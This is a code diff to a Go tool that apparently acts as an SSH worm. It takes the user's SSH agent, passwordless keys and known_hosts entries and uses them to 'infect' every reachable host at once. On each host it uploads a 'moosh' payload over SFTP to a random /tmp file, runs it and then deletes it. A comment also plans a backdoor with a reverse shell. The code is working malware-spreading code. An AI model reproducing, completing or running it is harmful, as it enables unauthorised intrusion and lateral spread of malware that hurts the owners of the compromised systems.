@@ -1,26 +1,30 @@
 package main
 
 import (
+	"encoding/hex"
 	"flag"
-	"fmt"
 	"io"
 	"io/ioutil"
 	"log"
+	"math/rand"
 	"net"
 	"os"
 	"os/exec"
 	"os/user"
 	"path/filepath"
 	"strings"
+	"sync"
+	"time"
 
 	"github.com/pkg/errors"
+	"github.com/pkg/sftp"
 	"golang.org/x/crypto/ssh"
 	"golang.org/x/crypto/ssh/agent"
 )
 
-// TODO: add shellcode of the exploit - maybe generate it?
-var Moosh64 = []byte("'echo hello > /tmp/hello'")
-var Moosh86 = []byte("'echo hello > /tmp/hello'")
+func init() {
+	rand.Seed(time.Now().Unix())
+}
 
 type SSHConfig struct {
 	AgentSocket string
@@ -85,7 +89,47 @@ func (r SSHRunner) Run(cmd string) error {
 }
 
 func (r SSHRunner) RunShellCode(b []byte) error {
-	return r.Run(fmt.Sprintf("echo %s > /tmp/moosh && chmod +x /tmp/moosh && /tmp/moosh", string(b)))
+	cl, err := sftp.NewClient(r.Client)
+	if err != nil {
+		return errors.Wrap(err, "failed to start SFTP client")
+	}
+
+	suf := make([]byte, 5)
+
+	_, err = rand.Read(suf)
+	if err != nil {
+		return errors.Wrap(err, "failed to generate random bytes")
+	}
+
+	path := "/tmp/" + hex.EncodeToString(suf)
+
+	f, err := cl.Create(path)
+	if err != nil {
+		return errors.Wrapf(err, "failed to create %s", path)
+	}
+
+	_, err = f.Write(b)
+	if err != nil {
+		return errors.Wrapf(err, "failed to write shell code to %s", path)
+	}
+
+	if err = f.Chmod(0755); err != nil {
+		return errors.Wrapf(err, "failed to chmod 755 %s", path)
+	}
+
+	if err = f.Close(); err != nil {
+		return errors.Wrapf(err, "failed to close %s", path)
+	}
+
+	if err = r.Run(path); err != nil {
+		return errors.Wrapf(err, "failed to run shellcode at %s", path)
+	}
+
+	if err = cl.Remove(path); err != nil {
+		return errors.Wrapf(err, "failed to remove shellcode from %s", path)
+	}
+
+	return errors.Wrap(cl.Close(), "failed to close SFTP connection")
 }
 
 type Runner interface {
@@ -119,18 +163,18 @@ func main() {
 	useSSHAgent := flag.Bool("useSSHAgent", false, "Whether or not use SSH agent")
 	useSSHKey := flag.Bool("useSSHKey", false, "Whether or not use (passwordless) SSH private key")
 	useKnownHosts := flag.Bool("useSSHKnown", false, "Whether or not to try to infect all hosts in SSH known_hosts file")
+	moosh := flag.String("moosh", "./bin/moosh", "Path to moosh")
 	addr := flag.String("addr", "", "The lucky guy")
-	arch := flag.String("arch", "x64", "Bitness of the system, (x64 or x86)")
 	flag.Parse()
 
-	if *arch != "x86" && *arch != "x64" || *addr == "" && !*useKnownHosts {
+	if *addr == "" && !*useKnownHosts {
 		flag.Usage()
 		os.Exit(1)
 	}
 
-	moosh := Moosh64
-	if *arch == "x86" {
-		moosh = Moosh86
+	pld, err := ioutil.ReadFile(*moosh)
+	if err != nil {
+		log.Fatalf("Failed to read moosh: %s", err)
 	}
 
 	switch {
@@ -184,21 +228,28 @@ func main() {
 			conf.AgentSocket = sshAgent
 		}
 
+		wg := &sync.WaitGroup{}
 		for _, a := range addrs {
-			conf := conf
-			conf.Addr = a
+			wg.Add(1)
+			go func(conf SSHConfig, addr string) {
+				defer wg.Done()
 
-			r, err := NewSSHRunner(conf)
-			if err != nil {
-				log.Printf("Failed to initialize SSH connection: %s", err)
-				continue
-			}
+				conf.Addr = addr
 
-			if err = r.RunShellCode(moosh); err != nil {
-				log.Fatalf("Failed to pwn %s: %s", a, err)
-			}
-			log.Printf("%s pwned", a)
+				r, err := NewSSHRunner(conf)
+				if err != nil {
+					log.Printf("Failed to initialize SSH connection: %s", err)
+					return
+				}
+
+				log.Printf("Infecting %s...", addr)
+				if err = r.RunShellCode(pld); err != nil {
+					log.Fatalf("Failed to pwn %s: %s", addr, err)
+				}
+				log.Printf("%s infected", addr)
+			}(conf, a)
 		}
+		wg.Wait()
 	default:
 		// TODO: attempt to connect to the backdoor
 		// and return the reverse shell
